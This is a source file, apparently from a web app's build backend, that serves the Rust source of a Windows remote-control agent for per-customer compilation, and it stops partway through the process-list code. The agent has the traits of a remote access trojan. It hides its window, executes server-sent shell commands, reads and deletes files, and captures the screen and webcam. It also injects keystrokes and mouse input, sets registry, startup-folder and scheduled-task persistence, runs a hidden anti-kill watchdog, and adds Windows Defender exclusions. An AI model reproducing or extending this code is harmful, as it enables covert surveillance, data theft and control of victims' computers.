import { createFileRoute } from '@tanstack/react-router'
import { supabaseAdmin } from '@/integrations/supabase/client.server'

// ─────────────────────────────────────────────────────────────────────────────
// Rust agent stub served to the build server.
//
// The build server fetches this, writes each file into a temp directory,
// substitutes {{PLACEHOLDERS}} in binding.rs, then runs:
//   cargo build --release --target x86_64-pc-windows-gnu
//
// Features implemented in the agent:
//   • Auto-register + heartbeat + command poll (HTTP)
//   • Screen capture + JPEG streaming
//   • Camera capture (ffmpeg on Windows)
//   • Remote shell (cmd /C)
//   • Filesystem list/read/delete
//   • Process list/kill
//   • System actions (shutdown, restart, lock, notify, volume, sound)
//   • WebRTC live-stream (H.264 via openh264 + Supabase Realtime signaling)
//   • HidenHost relay (WSS) for real-time frame streaming + command reception
//   • Clipboard get/set
//   • Input mouse/keyboard forwarding placeholders
//   • Scheduled-task startup (Windows schtasks)
// ─────────────────────────────────────────────────────────────────────────────

const bindingRs = `// Per-build constants — overwritten by the build server before \`cargo build\`.
pub const OWNER_USER_ID: &str = "{{USER_ID}}";
pub const SENTINEL_SERVER: &str = "{{API_BASE}}";
pub const BUILD_NAME: &str = "{{BUILD_NAME}}";
pub const STARTUP_TASK: bool = {{FEATURE_STARTUP}};
pub const STARTUP_NAME: &str = "{{STARTUP_NAME}}";
pub const DEBUG_CONSOLE: bool = {{DEBUG}};
pub const ANTIKILL: bool = {{FEATURE_ANTIKILL}};
pub const WD_EXCLUSION: bool = {{FEATURE_WD_EXCLUSION}};
pub const REQUIRE_ADMIN: bool = {{FEATURE_REQUIRE_ADMIN}};
pub const BUILD_TAG: &str = "{{BUILD_TAG}}";

pub const SUPABASE_URL: &str = "{{SUPABASE_URL}}";
pub const SUPABASE_ANON_KEY: &str = "{{SUPABASE_ANON_KEY}}";

pub const HIDEN_WS_URL: &str = "{{RELAY_URL}}";
pub const HIDEN_HTTP_URL: &str = "{{RELAY_HTTP_URL}}";
pub const HIDEN_AUTH_KEY: &str = "{{HIDEN_AUTH_KEY}}";
`

const mainRs = `// Sentinel Agent — Rust edition.
// Two build targets share this source:
//   agent.exe  → built with --subsystem windows (no console)
//   debug.exe  → normal console build (prints logs)
// First run: auto-registers with the server, persists token next to the exe.
// Then: heartbeats every 5s, polls commands every 1s, streams screen on demand.
// HidenHost relay: connects via WSS for real-time frame push + command reception.

#![cfg_attr(all(windows, not(debug_assertions), feature = "windowed"), windows_subsystem = "windows")]

use base64::Engine;
use serde::{Deserialize, Serialize};
use serde_json::{json, Value};
use std::{
    fs,
    path::PathBuf,
    process::Command,
    sync::{
        atomic::{AtomicBool, Ordering},
        Arc, Mutex,
    },
    thread,
    time::{Duration, Instant},
};

mod binding;
mod hiden;
mod signaling;
mod webrtc;

const DEFAULT_SERVER: &str = binding::SENTINEL_SERVER;
const BIND_USER_ID: Option<&str> = if binding::OWNER_USER_ID.is_empty() {
    None
} else {
    Some(binding::OWNER_USER_ID)
};
const STARTUP_FLAG: bool = binding::STARTUP_TASK;
const STARTUP_NAME_STR: &str = binding::STARTUP_NAME;

#[derive(Serialize, Deserialize, Clone)]
struct Config {
    server: String,
    device_id: String,
    device_token: String,
}

/// Dynamic stream settings shared between command handlers and the stream thread.
#[derive(Clone)]
struct StreamConfig {
    quality: u8,
    fps_cap: u32,
}

impl Default for StreamConfig {
    fn default() -> Self {
        Self { quality: 60, fps_cap: 30 }
    }
}

fn config_path() -> PathBuf {
    std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.join("sentinel-agent.json")))
        .unwrap_or_else(|| PathBuf::from("sentinel-agent.json"))
}

fn load_config() -> Option<Config> {
    let s = fs::read_to_string(config_path()).ok()?;
    serde_json::from_str(&s).ok()
}

fn save_config(c: &Config) {
    if let Ok(s) = serde_json::to_string_pretty(c) {
        let _ = fs::write(config_path(), s);
    }
}

fn is_stale_server_url(server: &str) -> bool {
    let current = DEFAULT_SERVER.trim_end_matches('/');
    let saved = server.trim_end_matches('/');
    saved != current || saved.contains("lovableproject.com") || saved.contains("id-preview--")
}

macro_rules! log {
    ($($arg:tt)*) => {{
        eprintln!("[{}] {}", chrono_like_ts(), format!($($arg)*));
    }}
}

fn chrono_like_ts() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let secs = SystemTime::now().duration_since(UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0);
    let h = (secs / 3600) % 24;
    let m = (secs / 60) % 60;
    let s = secs % 60;
    format!("{:02}:{:02}:{:02}", h, m, s)
}

fn http() -> ureq::Agent {
    ureq::AgentBuilder::new()
        .timeout_connect(Duration::from_secs(10))
        .timeout(Duration::from_secs(60))
        .user_agent("SentinelAgent-Rust/0.3")
        .build()
}

fn post(server: &str, path: &str, body: &Value) -> Result<Value, String> {
    let url = format!("{}{}", server.trim_end_matches('/'), path);
    match http().post(&url).send_json(body.clone()) {
        Ok(resp) => resp.into_json::<Value>().map_err(|e| e.to_string()),
        Err(ureq::Error::Status(code, resp)) => {
            let body = resp.into_string().unwrap_or_default();
            Err(format!("server {}: {}", code, body))
        }
        Err(e) => Err(e.to_string()),
    }
}

fn pc_name() -> String {
    gethostname::gethostname().to_string_lossy().to_string()
}
fn username() -> String {
    whoami::username()
}
fn os_name() -> String {
    if cfg!(windows) { "Windows".into() }
    else if cfg!(target_os = "macos") { "macOS".into() }
    else { "Linux".into() }
}

fn auto_register(server: &str) -> Result<Config, String> {
    let mut body = json!({
        "pc_name": pc_name(),
        "device_name": pc_name(),
        "os": os_name(),
        "username": username(),
    });
    if let Some(uid) = BIND_USER_ID {
        body["bind_user_id"] = json!(uid);
    }
    if !binding::BUILD_TAG.is_empty() {
        body["tag"] = json!(binding::BUILD_TAG);
    }
    let resp = post(server, "/api/public/agent/auto-register", &body)?;
    let device_id = resp.get("device_id").and_then(|v| v.as_str())
        .ok_or("missing device_id")?.to_string();
    let device_token = resp.get("device_token").and_then(|v| v.as_str())
        .ok_or("missing device_token")?.to_string();
    let cfg = Config { server: server.to_string(), device_id, device_token };
    save_config(&cfg);
    if STARTUP_FLAG { let _ = install_startup(); }
    if binding::ANTIKILL { let _ = install_antikill(); }
    Ok(cfg)
}

#[cfg(windows)]
fn persistence_record_path() -> PathBuf {
    std::env::current_exe()
        .ok()
        .and_then(|p| p.parent().map(|d| d.join("sentinel-persistence.json")))
        .unwrap_or_else(|| PathBuf::from("sentinel-persistence.json"))
}

#[cfg(windows)]
fn save_persistence_paths(paths: &serde_json::Value) {
    if let Ok(s) = serde_json::to_string_pretty(paths) {
        let _ = fs::write(persistence_record_path(), s);
    }
}

#[cfg(windows)]
fn load_persistence_paths() -> serde_json::Value {
    fs::read_to_string(persistence_record_path())
        .ok()
        .and_then(|s| serde_json::from_str::<Value>(&s).ok())
        .unwrap_or_else(|| json!({"entries": []}))
}

#[cfg(windows)]
fn install_startup() -> serde_json::Value {
    let name = STARTUP_NAME_STR;
    let exe = match std::env::current_exe() {
        Ok(p) => p.to_string_lossy().to_string(),
        Err(_) => return json!({"entries": [], "error": "no exe path"}),
    };
    let mut entries: Vec<Value> = vec![];

    // 1. HKCU Run registry key
    let reg_script = format!(
        "New-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name '{}' -Value '\\\"{}\\\"' -PropertyType String -Force | Out-Null",
        name.replace('\\'', ""), exe.replace('\\'', "")
    );
    let reg_ok = powershell(&reg_script).is_ok();
    entries.push(json!({
        "kind": "registry",
        "path": format!("HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run\\\\{}", name),
        "ok": reg_ok,
    }));

    // 2. Startup folder shortcut (.lnk)
    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let lnk_path = format!("{}\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\{}.lnk", appdata, name);
    let lnk_script = format!(
        "$ws = New-Object -ComObject WScript.Shell; \
         $s = $ws.CreateShortcut('{}'); \
         $s.TargetPath = '{}'; \
         $s.WorkingDirectory = '{}'; \
         $s.WindowStyle = 7; \
         $s.Save()",
        ps_escape(&lnk_path),
        ps_escape(&exe),
        ps_escape(&std::path::Path::new(&exe).parent().map(|p| p.to_string_lossy().to_string()).unwrap_or_default())
    );
    let lnk_ok = powershell(&lnk_script).is_ok();
    entries.push(json!({
        "kind": "startup_folder",
        "path": lnk_path,
        "ok": lnk_ok,
    }));

    // 3. Scheduled task (ONLOGON, highest priv)
    let task_script = format!(
        "schtasks /Create /F /SC ONLOGON /RL HIGHEST /TN \\\"{}\\\" /TR \\\"\\\\\\\"{}\\\\\\\"\\\" | Out-Null",
        name.replace('\\'', ""), exe.replace('\\'', "")
    );
    let task_ok = powershell(&task_script).is_ok();
    entries.push(json!({
        "kind": "scheduled_task",
        "path": format!("Task Scheduler\\\\{}", name),
        "ok": task_ok,
    }));

    let result = json!({"entries": entries, "exe": exe});
    save_persistence_paths(&result);
    result
}

#[cfg(windows)]
fn uninstall_startup() -> serde_json::Value {
    let name = STARTUP_NAME_STR;
    let mut entries: Vec<Value> = vec![];

    let reg_script = format!(
        "Remove-ItemProperty -Path 'HKCU:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run' -Name '{}' -ErrorAction SilentlyContinue",
        name.replace('\\'', "")
    );
    entries.push(json!({"kind": "registry", "removed": powershell(&reg_script).is_ok()}));

    let appdata = std::env::var("APPDATA").unwrap_or_default();
    let lnk_path = format!("{}\\\\Microsoft\\\\Windows\\\\Start Menu\\\\Programs\\\\Startup\\\\{}.lnk", appdata, name);
    let _ = fs::remove_file(&lnk_path);
    entries.push(json!({"kind": "startup_folder", "path": lnk_path, "removed": true}));

    let task_script = format!("schtasks /Delete /F /TN \\\"{}\\\" | Out-Null", name.replace('\\'', ""));
    entries.push(json!({"kind": "scheduled_task", "removed": powershell(&task_script).is_ok()}));

    let _ = fs::remove_file(persistence_record_path());
    json!({"entries": entries})
}

#[cfg(not(windows))]
fn install_startup() -> serde_json::Value { json!({"entries": [], "note": "non-windows"}) }
#[cfg(not(windows))]
fn uninstall_startup() -> serde_json::Value { json!({"entries": [], "note": "non-windows"}) }

// ---------- anti-kill watchdog ----------
//
// Spawns a hidden PowerShell loop that polls every 5s; if our PID is gone
// it relaunches the exe. The watchdog itself is registered to startup too
// so killing the agent + the watchdog still resurrects on next logon.

#[cfg(windows)]
fn install_antikill() -> serde_json::Value {
    use std::os::windows::process::CommandExt;
    const DETACHED_PROCESS: u32 = 0x0000_0008;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let exe = match std::env::current_exe() {
        Ok(p) => p.to_string_lossy().to_string(),
        Err(_) => return json!({"ok": false, "error": "no exe path"}),
    };
    let pid = std::process::id();
    let watchdog_name = format!("{}-watchdog", STARTUP_NAME_STR);
    let watchdog_ps = std::env::temp_dir().join(format!("{}.ps1", watchdog_name.replace(' ', "_")));

    let script = format!(
        "$exe = '{}'; $pid0 = {}; \
         while ($true) {{ \
           try {{ Get-Process -Id $pid0 -ErrorAction Stop | Out-Null }} \
           catch {{ \
             try {{ Start-Process -FilePath $exe -WindowStyle Hidden }} catch {{}}; \
             Start-Sleep -Seconds 3; \
             $p = Get-Process | Where-Object {{ $_.Path -eq $exe }} | Select-Object -First 1; \
             if ($p) {{ $pid0 = $p.Id }} \
           }}; \
           Start-Sleep -Seconds 5 \
         }}",
        ps_escape(&exe), pid
    );
    if fs::write(&watchdog_ps, script).is_err() {
        return json!({"ok": false, "error": "write watchdog failed"});
    }

    // Launch watchdog detached
    let spawn_ok = Command::new("powershell")
        .args(["-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-File",
               watchdog_ps.to_str().unwrap_or("")])
        .creation_flags(DETACHED_PROCESS | CREATE_NO_WINDOW)
        .spawn().is_ok();

    // Also register watchdog itself as a scheduled task so killing both still recovers on next logon
    let task_script = format!(
        "schtasks /Create /F /SC ONLOGON /RL HIGHEST /TN \\\"{}\\\" /TR \\\"powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File \\\\\\\"{}\\\\\\\"\\\" | Out-Null",
        watchdog_name.replace('\\'', ""),
        watchdog_ps.to_string_lossy().replace('\\'', "")
    );
    let task_ok = powershell(&task_script).is_ok();

    json!({
        "ok": spawn_ok,
        "watchdog_script": watchdog_ps.to_string_lossy(),
        "scheduled_task": task_ok,
    })
}

#[cfg(windows)]
fn uninstall_antikill() -> serde_json::Value {
    let watchdog_name = format!("{}-watchdog", STARTUP_NAME_STR);
    let task_script = format!("schtasks /Delete /F /TN \\\"{}\\\" | Out-Null", watchdog_name.replace('\\'', ""));
    let _ = powershell(&task_script);
    // Best-effort kill of watchdog process
    let kill_script = "Get-WmiObject Win32_Process -Filter \\\"Name = 'powershell.exe'\\\" | Where-Object { $_.CommandLine -like '*-watchdog*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force }";
    let _ = powershell(kill_script);
    json!({"ok": true})
}

#[cfg(not(windows))]
fn install_antikill() -> serde_json::Value { json!({"ok": false, "note": "non-windows"}) }
#[cfg(not(windows))]
fn uninstall_antikill() -> serde_json::Value { json!({"ok": true, "note": "non-windows"}) }

// ---------- privilege elevation + Defender exclusion ----------

#[cfg(windows)]
fn is_elevated() -> bool {
    // Heuristic: try to open the local admin-only registry key for write.
    // Avoids pulling in extra winapi crates.
    let out = std::process::Command::new("net")
        .args(["session"])
        .output();
    match out {
        Ok(o) => o.status.success(),
        Err(_) => false,
    }
}

#[cfg(windows)]
fn relaunch_elevated() -> bool {
    let exe = match std::env::current_exe() {
        Ok(p) => p.to_string_lossy().to_string(),
        Err(_) => return false,
    };
    // Use PowerShell Start-Process -Verb RunAs to trigger UAC.
    let script = format!(
        "Start-Process -FilePath \\\"{}\\\" -Verb RunAs",
        exe.replace('\\'', \"\")
    );
    let r = std::process::Command::new("powershell")
        .args(["-NoProfile", "-WindowStyle", "Hidden", "-Command", &script])
        .status();
    matches!(r, Ok(s) if s.success())
}

#[cfg(windows)]
fn add_defender_exclusion() -> serde_json::Value {
    let exe = std::env::current_exe().ok();
    let dir = exe.as_ref().and_then(|p| p.parent()).map(|p| p.to_string_lossy().to_string()).unwrap_or_default();
    let exe_path = exe.map(|p| p.to_string_lossy().to_string()).unwrap_or_default();
    let safe_dir = dir.replace('\\'', "");
    let safe_exe = exe_path.replace('\\'', "");
    let script = format!(
        "try {{ Add-MpPreference -ExclusionPath \\\"{}\\\" -ErrorAction SilentlyContinue; Add-MpPreference -ExclusionProcess \\\"{}\\\" -ErrorAction SilentlyContinue }} catch {{}}",
        safe_dir, safe_exe
    );
    let _ = powershell(&script);
    json!({"ok": true, "path": safe_dir})
}

#[cfg(not(windows))]
fn is_elevated() -> bool { true }
#[cfg(not(windows))]
fn relaunch_elevated() -> bool { false }
#[cfg(not(windows))]
fn add_defender_exclusion() -> serde_json::Value { json!({"ok": false, "note": "non-windows"}) }

static STARTED: once_cell_mini::Lazy<Instant> = once_cell_mini::Lazy::new(Instant::now);

mod once_cell_mini {
    use std::sync::OnceLock;
    pub struct Lazy<T, F = fn() -> T> { cell: OnceLock<T>, init: F }
    impl<T, F: Fn() -> T> Lazy<T, F> {
        pub const fn new(init: F) -> Self { Self { cell: OnceLock::new(), init } }
    }
    impl<T> std::ops::Deref for Lazy<T> {
        type Target = T;
        fn deref(&self) -> &T { self.cell.get_or_init(|| (self.init)()) }
    }
}

fn heartbeat(cfg: &Config) {
    let uptime = STARTED.elapsed().as_secs();
    let body = json!({
        "device_id": cfg.device_id,
        "device_token": cfg.device_token,
        "username": username(),
        "metrics": { "uptime_seconds": uptime },
    });
    if let Err(e) = post(&cfg.server, "/api/public/agent/heartbeat", &body) {
        log!("heartbeat err: {}", e);
    }
}

fn poll(cfg: &Config) -> Vec<Value> {
    let body = json!({ "device_id": cfg.device_id, "device_token": cfg.device_token });
    match post(&cfg.server, "/api/public/agent/poll", &body) {
        Ok(v) => v.get("commands").and_then(|c| c.as_array()).cloned().unwrap_or_default(),
        Err(e) => { log!("poll err: {}", e); vec![] }
    }
}

fn send_result(cfg: &Config, command_id: &str, ok: bool, result: Value, err: Option<String>) {
    let body = json!({
        "device_id": cfg.device_id,
        "device_token": cfg.device_token,
        "command_id": command_id,
        "ok": ok,
        "result": result,
        "error": err.unwrap_or_default(),
    });
    if let Err(e) = post(&cfg.server, "/api/public/agent/result", &body) {
        log!("result err: {}", e);
    }
}

fn push_screen(cfg: &Config, jpeg_b64: &str) -> Result<(), String> {
    let body = json!({
        "device_id": cfg.device_id,
        "device_token": cfg.device_token,
        "jpeg_b64": jpeg_b64,
    });
    post(&cfg.server, "/api/public/agent/screen", &body).map(|_| ())
}

fn push_camera(cfg: &Config, jpeg_b64: &str) -> Result<(), String> {
    let body = json!({
        "device_id": cfg.device_id,
        "device_token": cfg.device_token,
        "jpeg_b64": jpeg_b64,
    });
    post(&cfg.server, "/api/public/agent/camera", &body).map(|_| ())
}

// ---------- camera capture (Windows, via ffmpeg dshow if present) ----------

#[cfg(windows)]
static CAM_DEVICE: std::sync::OnceLock<Mutex<Option<String>>> = std::sync::OnceLock::new();

#[cfg(windows)]
fn find_camera_device() -> Result<String, String> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    let cache = CAM_DEVICE.get_or_init(|| Mutex::new(None));
    if let Ok(guard) = cache.lock() {
        if let Some(d) = guard.as_ref() { return Ok(d.clone()); }
    }
    let list = Command::new("ffmpeg")
        .args(["-hide_banner", "-list_devices", "true", "-f", "dshow", "-i", "dummy"])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|_| "ffmpeg not installed — install ffmpeg.exe in PATH for camera capture".to_string())?;
    let text = String::from_utf8_lossy(&list.stderr).to_string();
    let mut device: Option<String> = None;
    let mut in_video = false;
    for line in text.lines() {
        if line.contains("DirectShow video devices") { in_video = true; continue; }
        if line.contains("DirectShow audio devices") { in_video = false; }
        if in_video {
            if let (Some(a), Some(b)) = (line.find('"'), line.rfind('"')) {
                if b > a {
                    device = Some(line[a + 1..b].to_string());
                    break;
                }
            }
        }
    }
    let device = device.ok_or("no DirectShow video device found")?;
    if let Ok(mut g) = cache.lock() { *g = Some(device.clone()); }
    Ok(device)
}

#[cfg(windows)]
fn capture_camera_jpeg(_quality: u8) -> Result<Vec<u8>, String> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
    let device = find_camera_device()?;
    let tmp = std::env::temp_dir().join("sentinel-cam.jpg");
    let _ = fs::remove_file(&tmp);
    let arg = format!("video={}", device);
    let q = _quality.clamp(2, 31) as i32; // ffmpeg q:v scale (lower = better)
    let qarg = (32 - (_quality as i32 / 4)).clamp(2, 31).to_string();
    let _ = q;
    let out = Command::new("ffmpeg")
        .args(["-hide_banner", "-loglevel", "error", "-y", "-f", "dshow", "-i", &arg,
               "-frames:v", "1", "-q:v", &qarg, tmp.to_str().unwrap_or("cam.jpg")])
        .creation_flags(CREATE_NO_WINDOW)
        .output()
        .map_err(|e| e.to_string())?;
    if !out.status.success() {
        // device may have changed — invalidate cache
        if let Some(c) = CAM_DEVICE.get() { if let Ok(mut g) = c.lock() { *g = None; } }
        return Err(String::from_utf8_lossy(&out.stderr).to_string());
    }
    fs::read(&tmp).map_err(|e| e.to_string())
}

#[cfg(not(windows))]
fn capture_camera_jpeg(_q: u8) -> Result<Vec<u8>, String> {
    Err("camera capture only supported on Windows".into())
}

fn capture_jpeg(quality: u8) -> Result<(Vec<u8>, u32, u32), String> {
    #[cfg(windows)]
    {
        use std::os::windows::process::CommandExt;
        const CREATE_NO_WINDOW: u32 = 0x0800_0000;
        let tmp = std::env::temp_dir().join("sentinel-screen.jpg");
        let _ = fs::remove_file(&tmp);
        let q = quality.clamp(20, 90);
        let tmp_s = tmp.to_string_lossy().to_string();
        let script = format!(
            "Add-Type -AssemblyName System.Windows.Forms; \
             Add-Type -AssemblyName System.Drawing; \
             $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \
             $bmp = New-Object System.Drawing.Bitmap($b.Width, $b.Height); \
             $g = [System.Drawing.Graphics]::FromImage($bmp); \
             $g.CopyFromScreen($b.Location, [System.Drawing.Point]::Empty, $b.Size); \
             $g.Dispose(); \
             $codec = [System.Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object {{ $_.MimeType -eq 'image/jpeg' }}; \
             $ep = New-Object System.Drawing.Imaging.EncoderParameters(1); \
             $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, [long]{}); \
             $bmp.Save('{}', $codec, $ep); \
             $bmp.Dispose(); \
             Write-Output (\\\"$($b.Width)x$($b.Height)\\\")",
            q, tmp_s.replace("'", "''")
        );
        let out = Command::new("powershell")
            .args(["-NoProfile", "-NonInteractive", "-Command", &script])
            .creation_flags(CREATE_NO_WINDOW)
            .output()
            .map_err(|e| e.to_string())?;
        if !out.status.success() {
            return Err(String::from_utf8_lossy(&out.stderr).to_string());
        }
        let dims = String::from_utf8_lossy(&out.stdout).trim().to_string();
        let parts: Vec<&str> = dims.split('x').collect();
        let w: u32 = parts.first().and_then(|s| s.parse().ok()).unwrap_or(1920);
        let h: u32 = parts.get(1).and_then(|s| s.parse().ok()).unwrap_or(1080);
        let data = fs::read(&tmp).map_err(|e| e.to_string())?;
        Ok((data, w, h))
    }
    #[cfg(not(windows))]
    {
        let _ = quality;
        Err("screen capture only supported on Windows".into())
    }
}

// ---------- mouse / keyboard / input control (Windows) ----------

#[cfg(windows)]
fn mouse_action(event: &str, payload: &Value) -> Result<Value, String> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let x_rel = payload.get("xRel").and_then(|v| v.as_f64()).unwrap_or(-1.0);
    let y_rel = payload.get("yRel").and_then(|v| v.as_f64()).unwrap_or(-1.0);

    match event {
        "move" => {
            if x_rel < 0.0 || y_rel < 0.0 { return Ok(json!({"ok": true})); }
            let script = format!(
                "Add-Type -AssemblyName System.Windows.Forms; \
                 $b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \
                 [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]($b.Width*{}), [int]($b.Height*{}))",
                x_rel, y_rel
            );
            let _ = Command::new("powershell")
                .args(["-NoProfile", "-NonInteractive", "-Command", &script])
                .creation_flags(CREATE_NO_WINDOW)
                .output();
        }
        "down" | "up" => {
            let button = payload.get("button").and_then(|v| v.as_str()).unwrap_or("left");
            // Move to position first, then fire mouse event
            let (down_flag, up_flag) = match button {
                "right" => ("0x0008", "0x0010"),
                "middle" => ("0x0020", "0x0040"),
                _ => ("0x0002", "0x0004"),
            };
            let flag = if event == "down" { down_flag } else { up_flag };
            let mut script = String::new();
            script.push_str("Add-Type -AssemblyName System.Windows.Forms; ");
            script.push_str("Add-Type -Name M -Namespace W -MemberDefinition '[DllImport(\\\"user32.dll\\\")] public static extern void mouse_event(uint f, uint x, uint y, uint d, int e);'; ");
            if x_rel >= 0.0 && y_rel >= 0.0 {
                script.push_str(&format!(
                    "$b = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; \
                     [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point([int]($b.Width*{}), [int]($b.Height*{})); ",
                    x_rel, y_rel
                ));
            }
            script.push_str(&format!("[W.M]::mouse_event({}, 0, 0, 0, 0)", flag));
            let _ = Command::new("powershell")
                .args(["-NoProfile", "-NonInteractive", "-Command", &script])
                .creation_flags(CREATE_NO_WINDOW)
                .output();
        }
        "scroll" => {
            let dy = payload.get("dy").and_then(|v| v.as_f64()).unwrap_or(0.0);
            if dy.abs() < 1.0 { return Ok(json!({"ok": true})); }
            // 0x0800 = MOUSEEVENTF_WHEEL, delta is in units of 120
            let delta = if dy > 0.0 { -120i32 } else { 120 };
            let script = format!(
                "Add-Type -Name M -Namespace W -MemberDefinition '[DllImport(\\\"user32.dll\\\")] public static extern void mouse_event(uint f, uint x, uint y, uint d, int e);'; \
                 [W.M]::mouse_event(0x0800, 0, 0, {}, 0)", delta
            );
            let _ = Command::new("powershell")
                .args(["-NoProfile", "-NonInteractive", "-Command", &script])
                .creation_flags(CREATE_NO_WINDOW)
                .output();
        }
        _ => {}
    }
    Ok(json!({"ok": true}))
}

#[cfg(not(windows))]
fn mouse_action(_event: &str, _payload: &Value) -> Result<Value, String> {
    Ok(json!({"ok": true, "note": "mouse control only on Windows"}))
}

#[cfg(windows)]
fn key_action(payload: &Value) -> Result<Value, String> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let key = payload.get("key").and_then(|v| v.as_str()).unwrap_or("");
    let event_type = payload.get("type").and_then(|v| v.as_str()).unwrap_or("keydown");
    let ctrl = payload.get("ctrl").and_then(|v| v.as_bool()).unwrap_or(false);
    let shift = payload.get("shift").and_then(|v| v.as_bool()).unwrap_or(false);
    let alt = payload.get("alt").and_then(|v| v.as_bool()).unwrap_or(false);

    if event_type != "keydown" {
        // Only act on keydown to avoid double-firing
        return Ok(json!({"ok": true}));
    }

    // Map common keys to SendKeys notation
    let send_key = match key {
        "Enter" => "~",
        "Tab" => "{TAB}",
        "Escape" => "{ESC}",
        "Backspace" => "{BACKSPACE}",
        "Delete" => "{DELETE}",
        "ArrowUp" => "{UP}",
        "ArrowDown" => "{DOWN}",
        "ArrowLeft" => "{LEFT}",
        "ArrowRight" => "{RIGHT}",
        "Home" => "{HOME}",
        "End" => "{END}",
        "PageUp" => "{PGUP}",
        "PageDown" => "{PGDN}",
        "F1" => "{F1}", "F2" => "{F2}", "F3" => "{F3}", "F4" => "{F4}",
        "F5" => "{F5}", "F6" => "{F6}", "F7" => "{F7}", "F8" => "{F8}",
        "F9" => "{F9}", "F10" => "{F10}", "F11" => "{F11}", "F12" => "{F12}",
        " " => " ",
        k if k.len() == 1 => k,
        _ => { return Ok(json!({"ok": true, "skipped": key})); }
    };

    // Build SendKeys string with modifiers
    let mut combo = String::new();
    if ctrl { combo.push('^'); }
    if alt { combo.push('%'); }
    if shift { combo.push('+'); }
    // Escape special SendKeys chars in single-char keys
    let safe_key = match send_key {
        "+" | "^" | "%" | "~" | "(" | ")" | "{" | "}" | "[" | "]" => {
            format!("{{{}}}", send_key)
        }
        _ => send_key.to_string(),
    };
    combo.push_str(&safe_key);

    let escaped = combo.replace("'", "''");
    let script = format!(
        "Add-Type -AssemblyName System.Windows.Forms; \
         [System.Windows.Forms.SendKeys]::SendWait('{}')", escaped
    );
    let _ = Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-Command", &script])
        .creation_flags(CREATE_NO_WINDOW)
        .output();

    Ok(json!({"ok": true, "key": key}))
}

#[cfg(not(windows))]
fn key_action(_payload: &Value) -> Result<Value, String> {
    Ok(json!({"ok": true, "note": "keyboard control only on Windows"}))
}

#[cfg(windows)]
fn input_lock(locked: bool) -> Result<Value, String> {
    use std::os::windows::process::CommandExt;
    const CREATE_NO_WINDOW: u32 = 0x0800_0000;

    let val = if locked { "1" } else { "0" };
    let script = format!(
        "Add-Type -Name I -Namespace W -MemberDefinition '[DllImport(\\\"user32.dll\\\")] public static extern bool BlockInput(bool b);'; \
         [W.I]::BlockInput([bool]::Parse('{}'))", if locked { "True" } else { "False" }
    );
    let _ = Command::new("powershell")
        .args(["-NoProfile", "-NonInteractive", "-Command", &script])
        .creation_flags(CREATE_NO_WINDOW)
        .output();
    let _ = val;
    Ok(json!({"ok": true, "locked": locked}))
}

#[cfg(not(windows))]
fn input_lock(_locked: bool) -> Result<Value, String> {
    Ok(json!({"ok": true, "note": "input lock only on Windows"}))
}

// ---------- command handlers ----------

fn run_shell(cmd: &str) -> Value {
    #[cfg(windows)]
    let out = Command::new("cmd").args(["/C", cmd]).output();
    #[cfg(not(windows))]
    let out = Command::new("sh").args(["-c", cmd]).output();
    match out {
        Ok(o) => json!({
            "stdout": truncate(String::from_utf8_lossy(&o.stdout).to_string(), 200_000),
            "stderr": truncate(String::from_utf8_lossy(&o.stderr).to_string(), 200_000),
            "exit_code": o.status.code().unwrap_or(-1),
        }),
        Err(e) => json!({ "stdout": "", "stderr": e.to_string(), "exit_code": -1 }),
    }
}

fn truncate(mut s: String, n: usize) -> String {
    if s.len() > n { s.truncate(n); s.push_str("\\n…[truncated]"); }
    s
}

fn fs_list(p: &str) -> Result<Value, String> {
    let path = if p.is_empty() { if cfg!(windows) { "C:\\\\".into() } else { "/".into() } } else { p.to_string() };
    let entries = fs::read_dir(&path).map_err(|e| e.to_string())?;
    let mut out = vec![];
    for e in entries.flatten() {
        if let Ok(meta) = e.metadata() {
            out.push(json!({
                "name": e.file_name().to_string_lossy(),
                "is_dir": meta.is_dir(),
                "size": meta.len(),
            }));
        }
    }
    Ok(json!({ "path": path, "entries": out }))
}

fn fs_read(p: &str) -> Result<Value, String> {
    let meta = fs::metadata(p).map_err(|e| e.to_string())?;
    if meta.len() > 5_000_000 { return Err("file too large (max 5MB)".into()); }
    let data = fs::read(p).map_err(|e| e.to_string())?;
    Ok(json!({ "content": String::from_utf8_lossy(&data), "size": data.len() }))
}

fn fs_delete(p: &str) -> Result<Value, String> {
    let meta = fs::metadata(p).map_err(|e| e.to_string())?;
    if meta.is_dir() { fs::remove_dir_all(p) } else { fs::remove_file(p) }
        .map_err(|e| e.to_string())?;
    Ok(json!({ "deleted": p }))
}

fn proc_list() -> Result<Value, String> {
    #[cfg(windows)]
    {
        let out = Command::new("tasklist").args(["/fo", "csv", "/nh"])
            .output().map_err(|e| e.to_string())?;
        let text = String::from_utf8_lossy(&out.stdout);
        let mut procs = vec![];
        for line in text.lines() {
